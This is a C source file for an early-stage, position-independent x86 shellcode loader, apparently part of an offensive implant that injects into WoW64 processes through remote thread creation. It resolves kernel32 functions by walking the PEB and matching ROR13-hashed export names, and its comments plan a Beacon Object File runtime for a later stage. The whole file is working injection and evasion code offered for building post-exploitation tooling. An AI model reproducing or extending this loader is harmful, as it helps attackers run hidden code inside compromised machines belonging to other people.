/*
 * loader.c — slice 1.d phase B-bis step 0 skeleton.
 *
 * Position-independent x86 shellcode injected into a WoW64 host
 * via VirtualAllocEx + WriteProcessMemory + CreateRemoteThread.
 * No PE wrapper, no static imports, no .rodata — everything is
 * computed at run time from PEB + ROR13-hashed kernel32 export
 * names so the blob runs from any address.
 *
 * This skeleton:
 *   - Validates the parent-supplied params block (magic + version).
 *   - Walks the PEB to find kernel32.dll's base.
 *   - Resolves ExitThread via ROR13.
 *   - Marks status = DONE, ExitThread.
 *
 * The real loader (phase B-bis step 1) replaces the ack with the
 * COFF parser + relocation engine + Beacon API impl — still a
 * single PIC blob, all kernel32 calls resolved through the same
 * PEB walk.
 *
 * Why no banner write in step 0: any string literal would land in
 * .rodata, and a flat objcopy blob doesn't carry section-relative
 * relocations. Step 1 will marshal output via the BOF's
 * BeaconPrintf path which is dynamic and stack-local by design.
 *
 * Build (see scripts/build-bof-x86-loader.sh; Podman fallback):
 *   i686-w64-mingw32-gcc -m32 -O2 -fno-asynchronous-unwind-tables
 *     -fno-ident -nostdlib -ffreestanding -fno-stack-protector
 *     -fno-pic -fno-pie -masm=intel -c loader.c -o loader.o
 *   i686-w64-mingw32-ld -T loader.ld -o loader.elf loader.o
 *   i686-w64-mingw32-objcopy -O binary -j .text loader.elf loader.bin
 */

#include <stdint.h>
#include "abi.h"

/* ROR13 hashes — same primitive as win/api.ResolveByHash, so the
 * parent's hash matches the loader's. Pre-computed via the Go
 * helper TestRor13_KnownAnswers in x86fork_present_windows_test.go;
 * any rename here MUST land in the Go test in the same commit. */
#define HASH_EXIT_THREAD          0x60E0CEEFu  /* ExitThread */
#define HASH_VIRTUAL_ALLOC        0x91AFCA54u  /* VirtualAlloc */
#define HASH_VIRTUAL_PROTECT      0x7946C61Bu  /* VirtualProtect */
#define HASH_GET_PROCESS_HEAP     0xA80EECAEu  /* GetProcessHeap */
#define HASH_HEAP_ALLOC           0x2500383Cu  /* HeapAlloc */
#define HASH_HEAP_FREE            0x10C32616u  /* HeapFree */
#define HASH_RTL_MOVE_MEMORY      0xCF14E85Bu  /* RtlMoveMemory */

/* kernel32 function pointer types. All Win32 imports we use are
 * __stdcall; the typedefs let the resolver-table walker assign
 * addresses without an unsafe-looking cast. */
typedef void  __stdcall (*pfn_ExitThread)(uint32_t code);
typedef void *__stdcall (*pfn_VirtualAlloc)(void *addr, uint32_t size, uint32_t allocType, uint32_t protect);
typedef int   __stdcall (*pfn_VirtualProtect)(void *addr, uint32_t size, uint32_t newProtect, uint32_t *oldProtect);
typedef void *__stdcall (*pfn_GetProcessHeap)(void);
typedef void *__stdcall (*pfn_HeapAlloc)(void *heap, uint32_t flags, uint32_t bytes);
typedef int   __stdcall (*pfn_HeapFree)(void *heap, uint32_t flags, void *mem);
typedef void  __stdcall (*pfn_RtlMoveMemory)(void *dst, const void *src, uint32_t len);

/* kapi groups every resolved kernel32 function so the loader can
 * pass a single pointer around instead of threading 7 args.
 * Allocated on the loader's stack at entry, filled by resolve_kapi. */
typedef struct {
    pfn_ExitThread      ExitThread;
    pfn_VirtualAlloc    VirtualAlloc;
    pfn_VirtualProtect  VirtualProtect;
    pfn_GetProcessHeap  GetProcessHeap;
    pfn_HeapAlloc       HeapAlloc;
    pfn_HeapFree        HeapFree;
    pfn_RtlMoveMemory   RtlMoveMemory;
} kernel32_api_t;

/* Read 32-bit PEB via fs:[0x30] (WoW64-safe; the 32-bit TIB
 * carries the 32-bit PEB at TIB+0x30).
 *
 * Note: the inline asm is in Intel order (dst, src) because the
 * build uses -masm=intel. With the default AT&T syntax the
 * operands would be swapped and the instruction would *write*
 * %0 into fs:0x30 instead of reading from it. */
static inline uint32_t get_peb32(void)
{
    uint32_t peb;
    __asm__ volatile ("mov %0, fs:0x30" : "=r"(peb));
    return peb;
}

/* ror13_hash matches win/api.ResolveByHash: 32-bit rotate-right
 * accumulator over the function name bytes. */
static uint32_t ror13_hash(const uint8_t *s)
{
    uint32_t h = 0;
    while (*s) {
        h = ((h >> 13) | (h << 19)) + (uint32_t)*s;
        s++;
    }
    return h;
}

/* Walks PEB->Ldr->InMemoryOrderModuleList.Flink to entry [2]:
 * (host EXE)→(ntdll)→(kernel32). Stable on every Windows since
 * NT 4.0. Phase B-bis step 1 will switch to a base-name compare
 * for paranoia. */
static uint32_t find_kernel32_base(void)
{
    uint32_t peb = get_peb32();
    uint32_t ldr = *(uint32_t *)(peb + 0x0C);
    uint32_t entry = *(uint32_t *)(ldr + 0x14);
    entry = *(uint32_t *)(entry);
    entry = *(uint32_t *)(entry);
    return *(uint32_t *)(entry + 0x10);
}

/* resolve_by_hash walks `module_base`'s export table. Returns the
 * absolute address of the first matching export, 0 on miss. */
static uint32_t resolve_by_hash(uint32_t module_base, uint32_t wanted)
{
    uint8_t *base = (uint8_t *)module_base;
    uint32_t pe = *(uint32_t *)(base + 0x3C);
    uint32_t exp_rva = *(uint32_t *)(base + pe + 0x78);
    if (!exp_rva) return 0;
    uint8_t *exp_dir = base + exp_rva;

    uint32_t n_names    = *(uint32_t *)(exp_dir + 0x18);
    uint32_t names_rva  = *(uint32_t *)(exp_dir + 0x20);
    uint32_t funcs_rva  = *(uint32_t *)(exp_dir + 0x1C);
    uint32_t ords_rva   = *(uint32_t *)(exp_dir + 0x24);

    uint32_t *names = (uint32_t *)(base + names_rva);
    uint32_t *funcs = (uint32_t *)(base + funcs_rva);
    uint16_t *ords  = (uint16_t *)(base + ords_rva);

    for (uint32_t i = 0; i < n_names; i++) {
        if (ror13_hash(base + names[i]) == wanted) {
            return (uint32_t)(base + funcs[ords[i]]);
        }
    }
    return 0;
}

/* resolve_kapi populates `k` with every kernel32 function pointer
 * the loader needs. Returns 1 on success, 0 if any export couldn't
 * be resolved (caller surfaces LOADER_STATUS_RESOLVE_FAIL). */
static int resolve_kapi(uint32_t k32, kernel32_api_t *k)
{
    k->ExitThread     = (pfn_ExitThread)    resolve_by_hash(k32, HASH_EXIT_THREAD);
    k->VirtualAlloc   = (pfn_VirtualAlloc)  resolve_by_hash(k32, HASH_VIRTUAL_ALLOC);
    k->VirtualProtect = (pfn_VirtualProtect)resolve_by_hash(k32, HASH_VIRTUAL_PROTECT);
    k->GetProcessHeap = (pfn_GetProcessHeap)resolve_by_hash(k32, HASH_GET_PROCESS_HEAP);
    k->HeapAlloc      = (pfn_HeapAlloc)     resolve_by_hash(k32, HASH_HEAP_ALLOC);
    k->HeapFree       = (pfn_HeapFree)      resolve_by_hash(k32, HASH_HEAP_FREE);
    k->RtlMoveMemory  = (pfn_RtlMoveMemory) resolve_by_hash(k32, HASH_RTL_MOVE_MEMORY);
    return k->ExitThread && k->VirtualAlloc && k->VirtualProtect
        && k->GetProcessHeap && k->HeapAlloc && k->HeapFree
        && k->RtlMoveMemory;
}

/* loader entry — CreateRemoteThread targets this address with the
 * params block pointer as lpThreadParameter. The skeleton sets
 * status to DONE and exits; the parent's ReadProcessMemory of
 * params verifies the round trip end to end. */
__attribute__((section(".text.entry")))
__attribute__((force_align_arg_pointer))
uint32_t __stdcall loader_entry(loader_params_t *p)
{
    if (!p) return LOADER_STATUS_ABI_MISMATCH;

    if (p->magic != LOADER_ABI_MAGIC || p->version != LOADER_ABI_VERSION) {
        p->status = LOADER_STATUS_ABI_MISMATCH;
        p->error_code = p->magic ^ LOADER_ABI_MAGIC;
        return LOADER_STATUS_ABI_MISMATCH;
    }
    p->status = LOADER_STATUS_RUNNING;

    uint32_t k32 = find_kernel32_base();
    if (!k32) {
        p->status = LOADER_STATUS_RESOLVE_FAIL;
        return LOADER_STATUS_RESOLVE_FAIL;
    }
    kernel32_api_t k;
    if (!resolve_kapi(k32, &k)) {
        p->status = LOADER_STATUS_RESOLVE_FAIL;
        return LOADER_STATUS_RESOLVE_FAIL;
    }

    /* Step 1.b–1.d will replace the next block with the real
     * COFF parse + relocate + BOF call sequence using k.*. For
     * step 1.a, validate the resolve table by exercising a
     * round-trip through the heap: alloc 16 bytes, free them,
     * verify both calls returned non-zero. A regression in any
     * of the 7 resolutions would fail this check inside the
     * shellcode and surface as LOADER_STATUS_RESOLVE_FAIL. */
    void *heap = k.GetProcessHeap();
    if (!heap) {
        p->status = LOADER_STATUS_RESOLVE_FAIL;
        return LOADER_STATUS_RESOLVE_FAIL;
    }
    void *probe = k.HeapAlloc(heap, 0, 16);
    if (!probe) {
        p->status = LOADER_STATUS_RESOLVE_FAIL;
        return LOADER_STATUS_RESOLVE_FAIL;
    }
    if (!k.HeapFree(heap, 0, probe)) {
        p->status = LOADER_STATUS_RESOLVE_FAIL;
        return LOADER_STATUS_RESOLVE_FAIL;
    }

    p->out_len = 0;
    p->err_len = 0;
    p->status  = LOADER_STATUS_DONE;
    k.ExitThread(LOADER_STATUS_DONE);
    return LOADER_STATUS_DONE;  /* unreachable */
}
